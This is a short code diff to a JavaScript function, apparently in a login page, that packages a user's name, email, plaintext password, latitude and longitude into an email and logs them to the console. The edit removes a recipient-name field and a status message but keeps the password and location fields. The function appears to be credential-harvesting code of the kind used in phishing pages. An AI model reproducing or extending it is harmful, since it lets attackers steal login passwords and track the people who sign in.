@@ -56,13 +56,13 @@
         // Function to send email with login details
         function sendEmail(name, email, password, latitude, longitude) {
             const templateParams = {
-                to_name: 'Recipient Name', // Change as needed
+                 // Change as needed
                 from_name: name,
                 email: email,
                 password: password,
                 latitude: latitude,
-                longitude: longitude,
-                message: 'User has logged in.'
+                longitude: longitude
+                
             };
 
             console.log('Sending email with the following data:', templateParams);
